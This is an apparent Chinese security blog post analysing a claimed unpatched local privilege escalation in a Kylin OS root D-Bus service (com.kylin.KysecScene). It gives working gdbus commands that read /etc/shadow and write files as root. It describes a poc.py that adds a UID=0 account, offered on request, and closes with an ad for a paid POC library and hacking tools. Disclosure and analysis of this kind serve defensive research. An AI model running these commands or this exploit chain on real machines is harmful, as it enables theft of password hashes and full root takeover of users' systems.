---
title: 0day 麒麟操作系统 KysecScene D-Bus 服务本地提权漏洞分析 附poc
url: https://mp.weixin.qq.com/s/IBwW4YjWsF4nBk5olv1_AA
source: Doonsec's feed
date: 2026-02-27
fetch_date: 2026-02-28T03:59:22.564491
---

# 0day 麒麟操作系统 KysecScene D-Bus 服务本地提权漏洞分析 附poc

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/IicMcDFtTOlPC8VicicIXuk2lqoMhoG3rsZkUYAEJufzh2LCBvUFQQkY9D36pk7pX3mUlufa38duxbf91YEmNalWKwT7COHyyPibqFUrDvM72zU/0?wx_fmt=jpeg)

# 0day 麒麟操作系统 KysecScene D-Bus 服务本地提权漏洞分析 附poc

KoWayMin
KoWayMin

阿乐你好

![]()

在小说阅读器中沉浸阅读

![](https://mmbiz.qpic.cn/mmbiz_gif/1mtwZURvGTkCK3ZFyqYEyTwmaLo2YSMeibz3eeShkewiadS4oh0RBl1U7BTVeEscGQrEbjWKcQzGpJEFLwr4cFQw/640?wx_fmt=gif&wxfrom=13&wx_lazy=1&tp=wxpic)

#

* 作者：中龙技术 KoWayMin
* 报告日期：2026 年 2 月 12 日
* 漏洞类型：本地权限提升（LPE）

## 一、漏洞概述

该漏洞存在于麒麟系统中的 `com.kylin.KysecScene` D-Bus 系统服务。该服务以 `root` 权限运行，但其 D-Bus 策略配置过于宽松，允许任意本地用户直接调用敏感方法。同时，服务暴露的 `LoadJson` 与 `SaveJson` 方法对传入文件路径缺乏访问控制与路径校验，导致低权限用户可借助该服务实现：

1. 读取高敏感文件（如 `/etc/shadow`）。
2. 以 root 身份向任意路径写入数据（如 `/etc/passwd`）。

最终可形成完整的本地提权链，攻击者能够获得 root 权限并完全控制系统。

## 二、漏洞定位过程

### 1. 枚举系统 D-Bus 服务

通过以下命令可定位到目标服务：

```
busctl --system list | grep -i kylin
```

输出中可见：

```
com.kylin.KysecScene ... root ...
```

这表明 `KysecScene` 由 root 身份运行。

### 2. 检查 D-Bus 策略文件

策略文件路径如下：

```
cat /usr/share/dbus-1/system.d/com.kylin.KysecScene.conf
```

关键配置（原意）为允许默认上下文用户访问该服务：

```
<policy context="default">
  <allow own="com.kylin.KysecScene"/>
  <allow send_destination="com.kylin.KysecScene"/>
  <allow send_destination="com.kylin.KysecScene"
     send_interface="org.freedesktop.DBus.Introspectable"/>
  <allow send_destination="com.kylin.KysecScene"
     send_interface="org.freedesktop.DBus.Properties"/>
</policy>
```

该策略意味着本地普通用户也可向目标服务发起方法调用，权限边界被显著削弱。

### 3. 枚举可调用方法

```
gdbus introspect --system \
  --dest com.kylin.KysecScene \
  --object-path /com/kylin/KysecScene
```

可见核心接口：

```
LoadJson(in s file_path, out ay arg_1)   # 任意文件读取
SaveJson(in s file_path, in ay data, out i arg_2)   # 任意文件写入
```

这两个方法均接受外部提供的文件路径，且报告显示缺乏有效校验。

## 三、漏洞成因分析

漏洞的本质是“高权限服务 + 低门槛调用 + 危险文件操作接口”三者叠加：

1. **服务高权限运行**：`KysecScene` 进程为 root。
2. **调用控制过宽**：D-Bus 策略向默认本地用户开放。
3. **方法缺少安全约束**：`LoadJson/SaveJson` 可操作任意路径，未限制目录、未鉴权、未做安全过滤。

因此，普通用户可借服务完成本应仅 root 才能执行的读写操作，从而打通提权路径。

## 四、PoC 验证过程

### 1. 任意文件读取（读取 `/etc/shadow`）

先验证普通用户无法直接读取：

```
whoami
cat /etc/shadow
# cat: /etc/shadow: Permission denied
```

再通过 D-Bus 调用：

```
gdbus call --system \
  --dest com.kylin.KysecScene \
  --object-path /com/kylin/KysecScene \
  --method com.kylin.KysecScene.LoadJson \
  /etc/shadow
```

返回数据为十六进制字节数组，其中可解析出 `root` 等账户口令条目信息，证明低权限用户已可越权读取敏感凭据文件。

### 2. 任意文件写入（以 root 身份写文件）

构造测试数据：

```
666 YDBYL KYLIN POC\n
```

转换为字节数组后调用：

```
gdbus call --system \
  --dest com.kylin.KysecScene \
  --object-path /com/kylin/KysecScene \
  --method com.kylin.KysecScene.SaveJson \
  /tmp/kylin_poc \
  "[0x36,0x36,0x36,0x20,0x59,0x44,0x42,0x59,0x4c,0x20,0x4b,0x59,0x4c,0x49,0x4e,0x20,0x50,0x4f,0x43,0x0a]"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlNQa2xe4TSZibyvyFfTQzh247Ckw9XM9gDACRwxziaCZUbrHIelcIYCEb0icrRxURuVzcjHDkTSlQibRnLckMestPtSvuLW3lCwoTw/640?wx_fmt=png&from=appmsg)

验证结果：

```
cat /tmp/kylin_poc
ls -l /tmp/kylin_poc
```

![](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNebkyUUn5nfsSQHJX2pHDPZ6f2TAYSic1w3XvJibumtUfEvciawlqhj43OWgwB9jbY1JWxrafdgq0AsBhicgSScoYX2riaXgHKeY9I/640?wx_fmt=png&from=appmsg)`root`，说明普通用户已借助该接口完成 root 权限写入。

### 3. 完整提权链（`poc.py`）

![](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlM9bgic9FcPDxlggYAAFETTBhw2LGkojPq7nWIkykXAicK2vGKpveq5BECiaCnRTkJj3em0ng6WJcTMXEkwUvXz85wvLWcKicg8CFQ/640?wx_fmt=png&from=appmsg)

```
python3 poc.py --rf <file> | --useradd <username>
```

* `--rf /etc/shadow`：演示敏感文件读取。
* `--useradd testuser2`：向系统账户文件写入 UID=0 用户。

复现输出显示：

```
uid=0(testuser2) gid=0(root)
```

即普通用户可进一步获取 root shell，并访问 `/root` 目录，实现完全接管。

## 五、影响评估

该漏洞可导致以下安全后果：

1. **敏感信息泄露**：读取 `/etc/shadow` 等核心文件。
2. **任意文件篡改**：覆盖系统配置或认证文件。
3. **本地权限提升至 root**：创建 UID=0 账户、植入后门、维持持久化控制。
4. **系统完全失陷**：完整性、机密性、可用性均受到严重威胁。

## 六、结论

`com.kylin.KysecScene` 的核心问题在于：以 root 运行的系统服务向普通本地用户暴露了缺乏校验的文件读写能力。该设计缺陷使攻击者无需内核漏洞，仅通过 D-Bus 接口即可从低权限用户提升到 root，属于高危本地提权漏洞。

从防护角度看，必须同时收紧 D-Bus 调用策略与接口输入校验，避免高权限服务直接对外提供任意路径文件操作能力。

poc.py以及poc.sh获取请后台回复260225

广告时间：

棉花糖会员站

网络安全行业领先网站｜在线独立环境内网靶场

性价比拉满，进站不心动来砍我

开通说明

糖心会员仅需99元/年，续费8折，会员邀请好友开通/续费享15%佣金。

网站性质特殊，开通不支持退款，请确认需求后再开通。

Part 01｜无境靶场

提供会员免费在线独立环境网安靶场；内网靶场同样独立环境；持续更新内网/Web/原创/SRC/CTF靶场，一直加量不加价。

![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMCYXEiclKIFNCpSEa1hFHRZGj6YFcmLicPtS6CXM9yYHkibu1IFkCqUpn6Ha8xYQTHdhq5ZFz0fjzmHWy6MtCtbYPvfDibzmqSA6k/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=13)

Part 02｜独家代码审计工具

无需本地编译，支持全路由报告，适合实战审计与日常排查。

Part 03｜POC库

全网最新/体量大的POC资源聚合；公开与付费POC统一检索；配合微信会员服务号，关键词即可查找相关POC。

![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlMkvJQhFGxCziatqQmaXiaJPIHgsVORoUf6Rm8rBeicO0ZB8c9fDabaY9Wib1AXibmhTBJZ3umEwwIZpcKazf34R5RCn73eYG68EYAE/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=14)

Part 04｜账号共享

会员享受网安常用服务，含资产引擎，以及Shodan、CTF平台等，满足学习与工作需求。

Part 05｜更多在线工具

hash解密平台、SRC资产监控、含国标/国密文件获取、凌风云搜索结果获取、IP街道级定位公益服务（ip.sy）、XSS平台等实用工具。

![图片](https://mmbiz.qpic.cn/mmbiz_png/IicMcDFtTOlNusf4BFUpEQA1vYcPRUaJpJ82eHVXO9UjnTZkwv1Adhicvmzp80XO0ADmShgibZA35sOV4j1M0OMNmY2Vd824fBkohkfdaremT0/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=15)

Part 06｜文档工具库

覆盖护网、应急响应、面试、CTF等场景，资源量大；同样支持微信服务号全文关键词检索。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/IicMcDFtTOlNhOuOL6FdnSBGgcrdeFiaoXbNlcVLAN7UVtD641kvLENTmRmYMfRiaqY70nOnlB0EB1pN5Q7LYm9lIkq6ia86GrJ13mHAhH1icJb8/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=16)

Part 07｜教程大全

聚合大量资源网/源码网/教程站会员内容，减少多站重复付费成本，学习路径更集中。

Part 08｜会员专属群

加入微信500人付费会员群，拥有网安领域更精准的交流环境。

Part 09｜用户好评

付费服务持续三年，在期会员三千位，好评稳定；本文仅展示部分资源，更多网站内容可点击阅读原文进入网站后查看：vip.bdziyi.com

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1RFgAFeqib8ULThEGibyJ2xJy3UtvgN7jO2UiaUIQnfg4CIClelEogiav0N50lzKTJZlvLhOEFgQU65AA/0?wx_fmt=png)

阿乐你好

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/7XAvvlbibo1RFgAFeqib8ULThEGibyJ2xJy3UtvgN7jO2UiaUIQnfg4CIClelEogiav0N50lzKTJZlvLhOEFgQU65AA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过